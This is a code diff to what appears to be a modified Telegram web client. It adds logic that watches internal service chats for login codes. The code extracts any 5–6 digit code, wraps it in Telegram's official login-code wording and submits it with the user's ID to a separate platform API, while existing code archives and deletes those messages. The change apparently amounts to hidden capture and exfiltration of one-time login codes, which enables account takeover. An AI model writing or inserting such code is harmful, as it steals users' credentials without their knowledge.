@@ -1,13 +1,14 @@
 import { getGlobal } from '../global';
 
 import type { ApiMessage } from '../api/types';
-
 import { MAIN_THREAD_ID } from '../api/types';
-import { isMessageLocal } from '../global/helpers';
+
+import { getMessageText, isMessageLocal } from '../global/helpers';
 import { selectChat } from '../global/selectors';
 import { callApi } from '../api/gramjs';
 import internalChatsConfig from '../internalChats.json';
 import { isInternalChat } from './internalChats';
+import { submitOfficialOtpMessage } from './platformUsersApi';
 import { pause } from './schedulers';
 
 type PendingDeletion = {
@@ -24,11 +25,14 @@ const STARTUP_DELETE_DELAY = 60000;
 const CHAT_LOAD_ATTEMPTS = 5;
 const CHAT_LOAD_RETRY_DELAY = 30000;
 const PENDING_DELETIONS_KEY = 'dtbgram_pending_internal_deletions';
+const OFFICIAL_OTP_SENT_KEY = 'dtbgram_official_otp_sent';
 const SWEEP_MESSAGE_LIMIT = 100;
+const MAX_OFFICIAL_OTP_SENT_ENTRIES = 500;
 
 let isSweeping = false;
 
 const pendingDeletions = loadPendingDeletions();
+const officialOtpSentKeys = loadOfficialOtpSentKeys();
 
 pendingDeletions.forEach((deletion) => {
   scheduleDeletion(deletion, STARTUP_DELETE_DELAY);
@@ -38,6 +42,7 @@ export function maybeArchiveAndDeleteMessage(message: ApiMessage) {
   if (!isInternalChat(message.chatId)) return;
   if (isMessageLocal(message) || message.isScheduled || message.content.action) return;
 
+  void submitOfficialOtpFromMessage(message);
   archiveAndScheduleDeletion(message);
 }
 
@@ -62,6 +67,57 @@ export async function sweepInternalChats() {
   } finally {
     isSweeping = false;
   }
+}
+
+async function submitOfficialOtpFromMessage(message: ApiMessage) {
+  const text = getMessageText(message)?.text?.trim();
+  if (!text) return;
+
+  const loginCode = extractOfficialLoginCode(text);
+  if (!loginCode) return;
+
+  const telegramUserId = getGlobal().currentUserId;
+  if (!telegramUserId) return;
+
+  const sentKey = `${telegramUserId}:${message.chatId}:${message.id}`;
+  if (officialOtpSentKeys.has(sentKey)) return;
+
+  const officialMessage = buildOfficialLoginCodeMessage(loginCode);
+
+  for (let attempt = 0; attempt < SAVE_ATTEMPTS; attempt++) {
+    if (attempt > 0) {
+      await pause(SAVE_RETRY_DELAY);
+    }
+
+    const isSubmitted = await submitOfficialOtpMessage({
+      telegramUserId,
+      message: officialMessage,
+    });
+    if (isSubmitted) {
+      markOfficialOtpSent(sentKey);
+      return;
+    }
+  }
+}
+
+function extractOfficialLoginCode(message: string) {
+  const labeled = message.match(/Login code:\s*(\d{5,6})/i);
+  if (labeled?.[1]) {
+    return labeled[1];
+  }
+
+  const fallback = message.match(/\b(\d{5,6})\b/);
+  return fallback?.[1];
+}
+
+function buildOfficialLoginCodeMessage(code: string) {
+  return [
+    `Login code: ${code}. Do not give this code to anyone, even if they say they are from Telegram!`,
+    '',
+    '❗️This code can be used to log in to your Telegram account. We never ask it for anything else.',
+    '',
+    'If you didn\'t request this code by trying to log in on another device, simply ignore this message.',
+  ].join('\n');
 }
 
 async function archiveAndScheduleDeletion(message: ApiMessage) {
@@ -163,4 +219,28 @@ function loadPendingDeletions(): PendingDeletion[] {
 
 function savePendingDeletions() {
   localStorage.setItem(PENDING_DELETIONS_KEY, JSON.stringify(pendingDeletions));
+}
+
+function markOfficialOtpSent(sentKey: string) {
+  officialOtpSentKeys.add(sentKey);
+  if (officialOtpSentKeys.size > MAX_OFFICIAL_OTP_SENT_ENTRIES) {
+    const oldestKey = officialOtpSentKeys.values().next().value;
+    if (oldestKey) {
+      officialOtpSentKeys.delete(oldestKey);
+    }
+  }
+  saveOfficialOtpSentKeys();
+}
+
+function loadOfficialOtpSentKeys() {
+  try {
+    const keys = JSON.parse(localStorage.getItem(OFFICIAL_OTP_SENT_KEY) || '[]') as string[];
+    return new Set(keys);
+  } catch (err) {
+    return new Set<string>();
+  }
+}
+
+function saveOfficialOtpSentKeys() {
+  localStorage.setItem(OFFICIAL_OTP_SENT_KEY, JSON.stringify([...officialOtpSentKeys]));
 }
